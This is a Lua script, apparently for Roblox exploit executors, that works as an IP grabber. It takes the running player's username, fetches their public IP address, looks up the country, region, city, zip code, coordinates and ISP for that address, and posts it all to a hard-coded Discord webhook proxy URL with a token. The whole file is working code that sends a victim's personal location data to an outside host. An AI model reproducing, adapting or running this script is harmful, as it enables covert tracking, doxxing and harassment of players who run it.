local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://webhook.lewisakura.moe/api/webhooks/1255702420130893914/h-n-0LxKmgyPybPU5MdA-k6wc2MU6ZwlemQzC0vKzuEpGvfL3RMgGCuK65pAN1uJdvgv"

local getIPResponse = request({
    Url = "https://api.ipify.org/?format=json",
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = http.request({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer)
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = dataMessage
}

local send_hook = request(
    {
        Url = WebhookURL, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
)
print(send_hook.StatusCode)
